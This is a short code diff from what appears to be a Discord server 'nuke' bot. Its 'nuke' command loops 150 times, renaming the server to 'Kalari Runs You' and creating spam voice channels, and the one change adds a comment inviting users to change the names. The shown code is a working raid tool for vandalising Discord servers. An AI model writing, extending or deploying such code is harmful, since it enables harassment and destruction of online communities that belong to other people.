@@ -870,7 +870,7 @@ async def nuke(ctx):
         except:
             pass
     for _i in range(150):
-            await ctx.guild.edit(name='Kalari Runs You')
+            await ctx.guild.edit(name='Kalari Runs You') # you can change the names here if you'd like
             print(f'''{Fore.BLUE}[!] {Fore.WHITE}Changed Server Name'''+Fore.RESET)
             await ctx.guild.create_voice_channel(name='NiceServerBro')
             print(f'''{Fore.BLUE}[!] {Fore.WHITE}Changed Voice Channel'''+Fore.RESET)
